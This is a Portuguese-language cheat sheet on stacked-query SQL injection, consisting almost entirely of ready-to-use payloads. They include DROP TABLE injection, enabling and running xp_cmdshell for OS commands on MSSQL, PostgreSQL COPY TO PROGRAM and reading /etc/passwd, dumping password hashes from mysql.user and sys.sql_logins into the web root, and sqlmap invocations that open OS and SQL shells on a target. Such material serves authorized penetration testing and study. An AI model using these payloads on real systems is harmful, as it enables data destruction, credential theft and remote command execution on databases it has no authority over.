# Stacked Queries (Consultas Empilhadas)

## Como Funciona

Injeta múltiplos statements SQL separados por ponto e vírgula, permitindo executar comandos arbitrários além do SELECT original.

```sql
-- Query original: SELECT * FROM produtos WHERE id=1
-- Injeção: ; DROP TABLE produtos--
-- Resultado: executa ambas as queries
```

## DBMSs Suportados

| DBMS | Suporte | Observação |
|------|---------|-----------|
| MSSQL | ✓ TOTAL | xp_cmdshell disponível |
| PostgreSQL | ✓ TOTAL | Stacked nativo |
| MySQL | ✓ PARCIAL | Requer PDO ou multi_query() |
| Oracle | ✗ | Não suporta |
| SQLite | ✓ PARCIAL | Depende da biblioteca |

## Quando Usar

- DBMS suporta múltiplos statements
- Necessidade de DDL (CREATE, DROP, ALTER)
- Necessidade de DML (INSERT, UPDATE, DELETE)
- Execução de comandos OS (MSSQL via xp_cmdshell)

## Detecção com SQLMap

```bash
sqlmap -u "http://alvo.com/?id=1" \
  --technique=S \
  --level=3 \
  --batch

# MSSQL específico
sqlmap -u "http://alvo.com/?id=1" \
  --technique=S \
  --dbms=mssql \
  --level=3 \
  --batch
```

## Exploração MSSQL — xp_cmdshell

```sql
-- Habilitar xp_cmdshell (se desabilitado)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

-- Executar comando OS
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'net user';--

-- Exfiltrar resultado via tabela temporária
'; CREATE TABLE #out (output varchar(8000));
   INSERT INTO #out EXEC xp_cmdshell 'whoami';
   SELECT output FROM #out;--
```

## Exploração PostgreSQL — COPY

```sql
-- Executar comando via COPY TO/FROM
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/vlad.txt';--

-- Ler arquivo
'; COPY users FROM '/etc/passwd';--
```

## Exploração MySQL — Limitada

```sql
-- Inserir dados em outra tabela
'; INSERT INTO log_acesso (user, action) VALUES ('vlad', 'pwned');--

-- Se multi_query habilitado
'; SELECT user, password FROM mysql.user;--
```

## SQLMap com Shell OS

```bash
# Tentar shell OS via stacked queries (MSSQL)
sqlmap -u "http://alvo.com/?id=1" \
  --technique=S \
  --dbms=mssql \
  --os-shell \
  --batch

# Shell SQL interativo
sqlmap -u "http://alvo.com/?id=1" \
  --technique=S \
  --sql-shell \
  --batch
```

## Dumping com Stacked Queries

```sql
-- MySQL: inserir dados em tabela outfile
'; SELECT user, password FROM mysql.user INTO OUTFILE '/var/www/html/dump.txt';--

-- MSSQL: criar stored procedure de exfiltração
'; CREATE PROCEDURE dump_users AS SELECT name, password_hash FROM sys.sql_logins;
   EXEC dump_users;--
```

## Indicadores de Sucesso SQLMap

```
[INFO] GET parameter 'id' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable
```
